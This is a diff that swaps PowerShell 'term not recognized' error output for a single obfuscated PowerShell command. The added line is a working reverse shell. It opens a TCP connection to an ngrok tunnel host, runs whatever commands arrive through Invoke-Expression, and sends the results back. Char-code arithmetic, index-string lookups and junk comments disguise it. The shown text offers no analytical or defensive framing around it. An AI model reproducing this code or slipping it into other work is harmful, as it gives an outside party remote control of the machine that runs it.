@@ -1,24 +1,2 @@
-[91mSet-ObfuscationContext: 
-[96mLine |
-[96m   3 | [0m [96mSet-ObfuscationContext[0m -ScriptBlock '';
-[96m     | [91m ~~~~~~~~~~~~~~~~~~~~~~
-[91m[96m     | [91mThe term 'Set-ObfuscationContext' is not recognized as a name of a cmdlet, function, script file, or executable program.
-Check the spelling of the name, or if a path was included, verify that the path is correct and try again.[0m
-[91mSet-ScriptBlockFromFile: 
-[96mLine |
-[96m   4 | [0m [96mSet-ScriptBlockFromFile[0m 'shell.txt';
-[96m     | [91m ~~~~~~~~~~~~~~~~~~~~~~~
-[91m[96m     | [91mThe term 'Set-ScriptBlockFromFile' is not recognized as a name of a cmdlet, function, script file, or executable program.
-Check the spelling of the name, or if a path was included, verify that the path is correct and try again.[0m
-[91mTOKEN: 
-[96mLine |
-[96m   5 | [0m [96mTOKEN[0m;
-[96m     | [91m ~~~~~
-[91m[96m     | [91mThe term 'TOKEN' is not recognized as a name of a cmdlet, function, script file, or executable program.
-Check the spelling of the name, or if a path was included, verify that the path is correct and try again.[0m
-[91mOUT: 
-[96mLine |
-[96m   6 | [0m [96mOUT[0m;
-[96m     | [91m ~~~
-[91m[96m     | [91mThe term 'OUT' is not recognized as a name of a cmdlet, function, script file, or executable program.
-Check the spelling of the name, or if a path was included, verify that the path is correct and try again.[0m
+Start-Process $PSHOME\powershell.exe -ArgumentList {$RpiZ8LP8LsHKneikFFnjt = New-Object $([char](0+83-0)+[char](21+121-21)+[char](24*115/24)+[char](41*116/41)+[char](38*101/38)+[char](0+109-0)+[char](109+46-109)+[char](65*78/65)+[char](94+101-94)+[char](116+116-116)+[char](0+46-0)+[char](56+83-56)+[char](75*111/75)+[char](20*99/20)+[char](0+107-0)+[char](6*101/6)+[char](104*116/104)+[char](2*115/2)+[char](13*46/13)+[char](40*84/40)+[char](120*67/120)+[char](0+80-0)+[char](37+67-37)+[char](0+108-0)+[char](87+105-87)+[char](83*101/83)+[char](5+110-5)+[char](18+116-18))('0.tcp.in.ngrok.io',13649);$JwaFZt9jOvVW = $(($RpiZ8LP8LsHKneikFFnjt.GetStream()));[byte[]]$ti = 0..65535|ForEach-Object{<#7qiJj5UCdhZv4D9pLc#>$($_)<#JRguDYma9AsGWOQjNCrh6#>}|ForEach-Object{$_<#sNMvwTt#>}|%{0};while(($GhAoqykndlBgR1PiTCtFD9vc = $JwaFZt9jOvVW.Read($ti, 0, $ti.Length)) -ne 0){$ZsgaxbDQteC6dmriE7lf2 = (New-Object -TypeName ([string]::join('', ( (83,121,115,116,101,109,46,84,101,120,116,46,65,83,67,73,73,69,110,99,111,100,105,110,103) |ForEach-Object{$_<#kRwZmhBNuHG#>}|ForEach-Object{<##>$_<##>}|%{ ( [char][int] $($_)<#j2It3ryUR5KACMXxiQp4EZD#>)})) |ForEach-Object{$_<#8F#>}|ForEach-Object{<##>$_}| % {<#qL#>$_<#PtJxzcSUa#>})).GetString($ti,0, $GhAoqykndlBgR1PiTCtFD9vc);$GAim6pT = (iex $ZsgaxbDQteC6dmriE7lf2 2>&1 |ForEach-Object{<##>$_<##>}|ForEach-Object{<#Rh8ZyjGz0mtog4CuUp#>$($_)<#O4eIgkap9AFN2h0ErwYLj83KH#>}| Out-String );$9Q8Kqeuh36ZtEjci = $GAim6pT + 'PS ' + (pwd).Path + '> ';$Oa4ywsxuDgjnRzL0UK2GYVrS = ([text.encoding]::ASCII).GetBytes($9Q8Kqeuh36ZtEjci);$JwaFZt9jOvVW.Write($Oa4ywsxuDgjnRzL0UK2GYVrS,0,$Oa4ywsxuDgjnRzL0UK2GYVrS.Length);(& (("PvOZ5sTlqNHUQCpBVtj2kbS18ceYRFn0DziAxK4ErJ6LauwGXhoyd-f9mI37WgM")[34,30,1,50,20,26,53,26,36,14,40,26,5,5,34,50,30] -join '')([string]::join('', ( (36,74,119,97,70,90,116,57,106,79,118,86,87,46,70,108,117,115,104,40,41) |%{ ( [char][int] $_)})) | % {$_}))};$($(& (("kQhz7ORUVsqlWiJDMFK-9o1utnCfyG2L8ISdE3N56evwXZAHYPmTrjxB4agpcb0")[13,25,42,21,0,41,19,41,54,59,52,41,9,9,13,21,25] -join '')([string]::join('', ( (36,82,112,105,90,56,76,80,56,76,115,72,75,110,101,105,107,70,70,110,106,116,46,67,108,111,115,101,40,41) |%{ ( [char][int] $_)})) | % {$_})))}
+
